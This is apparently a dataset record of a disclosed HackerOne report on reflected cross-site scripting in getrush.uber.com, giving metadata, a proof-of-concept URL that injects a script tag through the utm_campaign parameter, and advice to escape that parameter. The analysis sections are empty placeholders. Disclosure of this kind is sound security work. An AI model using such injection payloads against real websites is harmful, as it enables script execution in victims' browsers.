---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '125112'
original_report_id: '125112'
title: XSS in getrush.uber.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: uber
created_at: '2016-03-22T20:06:31.836Z'
disclosed_at: '2016-04-06T20:59:15.219Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS in getrush.uber.com

## Metadata

- HackerOne Report ID: 125112
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: uber
- Disclosed At: 2016-04-06T20:59:15.219Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

'' 'https://getrush.uber.com/business?utm_campaign=tttttt%27%3C/script%3E%3Cscript%3Ealert(0)%3C/script%3E&utm_medium=top&utm_source=website'''

You need to escape the utm_campaign parameter before rendering it in the HTML. 

Thanks, 
David Dworken

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
